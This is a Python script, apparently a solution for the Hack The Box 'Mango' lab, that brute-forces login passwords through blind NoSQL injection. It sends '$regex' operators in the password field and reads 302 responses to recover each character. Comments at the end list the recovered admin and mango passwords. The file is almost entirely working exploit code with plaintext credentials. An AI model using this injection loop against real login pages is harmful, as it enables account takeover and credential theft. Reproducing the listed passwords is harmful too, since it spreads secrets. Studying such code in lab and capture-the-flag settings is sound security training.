import requests
import string

url = "http://staging-order.mango.htb/index.php"
proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
}
s = requests.Session()

r = s.get(url)

passwd = ""

reset = True
while reset:
    reset = False

    # for i in string.ascii_letters + string.digits + "!@#%^()<>_{}&-/~`":
    for i in string.printable:
        if i not in ['*','+','.','?','|', '#', '&', '$']:
            # data = {'username':'mango', 'password[$regex]': passwd + i + '.*'}
            data = {'username':'admin', 'password[$regex]': '^' + passwd + i} 
            r = s.post(url, data=data, proxies=proxies, allow_redirects=False)
            print("Trying " + passwd + i + "\t" + str(r.status_code))

            if r.status_code == 302:
                passwd += i
                print(passwd)
                reset = True
                break

# admin : t9KcS3>!0B#2
# mango : h3mXK8RhU~f{]f5H
